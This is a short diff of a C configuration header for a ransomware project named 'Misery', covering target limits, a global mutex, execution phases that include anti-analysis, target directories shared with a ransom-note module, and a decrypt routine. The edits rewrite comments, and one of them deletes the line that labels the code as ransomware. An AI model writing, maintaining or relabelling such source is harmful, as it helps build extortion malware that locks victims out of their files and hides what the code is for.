@@ -6,18 +6,14 @@
 #include <stdbool.h>
 #include <time.h>
 
-/*
- * MISERY RANSOMWARE Gui header
- */
-
-/* Configuration Magic */
+//Configuration
 #define MISERY_VERSION              "3.2"
 #define MISERY_BUILD_DATE           __DATE__
 #define MISERY_MAX_PATH             32768
 #define MISERY_MAX_TARGETS          10000
 #define MISERY_MUTEX_NAME           "Global\\Misery_Mutex_v32"
 
-/* Execution Phases */
+// These are execution phases
 typedef enum {
     PHASE_INIT = 0,
     PHASE_ANTI_ANALYSIS,
@@ -52,7 +48,7 @@ typedef struct {
 
 extern MISERY_GLOBAL_CTX g_misery_ctx;
 
-/* Target directories — defined in misery.c, used by ransomnote.c */
+/* Target directories defined in misery.c used by ransomnote.c */
 
 extern const char *g_target_dirs[];
 
@@ -69,7 +65,7 @@ void MiseryReportStats(void);
 bool MiseryInitContext(void);
 void MiseryCleanupContext(void);
 
-/* for misery.c */
-bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats);
+
+bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats); //for misery.c
 
 #endif // MISERY_CONFIG_H
